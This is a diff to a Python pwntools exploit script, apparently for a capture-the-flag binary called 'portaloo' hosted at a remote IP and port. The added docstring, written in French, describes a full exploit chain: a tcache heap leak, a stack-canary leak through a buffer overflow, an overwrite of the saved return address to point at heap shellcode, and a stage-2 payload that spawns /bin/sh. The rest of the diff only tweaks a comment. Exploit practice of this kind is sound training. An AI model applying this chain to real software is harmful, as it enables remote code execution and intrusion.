@@ -1,3 +1,32 @@
+"""
+Méthode : Heap leak → Canary leak → Shellcode execution → ROP
+
+- Heap leak :
+  Create portal(0), portal(1)
+  Destroy portal(1) → tcache freed chunk
+  Peek portal → leak heap address from FD pointer
+  Calculate heap base heap_leak << 12
+
+- Shellcode preparation :
+  Upgrade portal(0) avec shellcode 
+  Shellcode lea rsi, [rip]; syscall → read shellcode
+
+- Canary leak :
+  Menu option 5 → trigger buffer overflow
+  Send 73 'A's → reach canary 
+  Leak canary via partial overwrite 
+
+- ROP :
+  Overflow avec padding 72 bytes
+  Overwrite canary (restored)
+  Overwrite saved RIP avec heap_base + 0x2a0 (shellcode location)
+
+- Shellcode :
+  Send stage2 shellcode via read syscall
+  NOP sled + shellcraft.sh() → /bin/sh shell
+  Bypass NX via shellcode in heap
+"""
+
 #!/usr/bin/env python3
 
 from pwn import *
@@ -9,7 +38,7 @@ def start(argv=[], *a, **kw):
     if args.REMOTE:
         return remote('94.237.123.236', 38641, *a, **kw)
     else:
-        # Ajoute un ./ si besoin
+        # Ajouter un ./ si besoin
         return process(['./portaloo'] + argv, *a, **kw)
 
 def create_portal(idx):
